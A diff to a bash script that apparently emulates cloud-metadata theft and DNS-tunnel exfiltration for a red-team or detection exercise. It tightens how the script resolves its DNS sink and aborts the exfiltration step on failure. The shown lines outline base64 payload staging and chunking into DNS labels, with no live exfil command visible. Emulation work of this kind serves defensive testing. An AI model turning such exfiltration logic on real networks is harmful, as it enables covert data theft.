@@ -33,7 +33,11 @@ step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }
 
 resolve_sink() {
     # Resolve the sink hostname to an IP for dig's @server argument.
-    getent hosts "$DNS_SINK" 2>/dev/null | awk '{print $1; exit}' || echo "$DNS_SINK"
+    # (a pipeline's status is awk's, so test the captured output, not ||)
+    local ip
+    ip="$(getent hosts "$DNS_SINK" 2>/dev/null | awk '{print $1; exit}')"
+    [ -n "$ip" ] || { echo "[metadata-exfil] !! cannot resolve DNS sink '$DNS_SINK'" >&2; return 1; }
+    echo "$ip"
 }
 
 say "Northline :: metadata-theft + DNS-exfil emulation :: session=$SESSION"
@@ -64,7 +68,7 @@ say "encoded payload length: ${#B64} chars"
 
 # --- Step 4: Exfiltration over DNS ----------------------------------------
 step "Step 4: Exfiltration — DNS tunnel to sink (ATT&CK T1048.003)"
-SINK_IP="$(resolve_sink)"
+SINK_IP="$(resolve_sink)" || { say "!! cannot resolve DNS sink $DNS_SINK — is dns-sink running? aborting."; exit 1; }
 say "using DNS sink @ $SINK_IP"
 # DNS labels max 63 chars; keep well under and split into one label per query.
 CHUNK=48
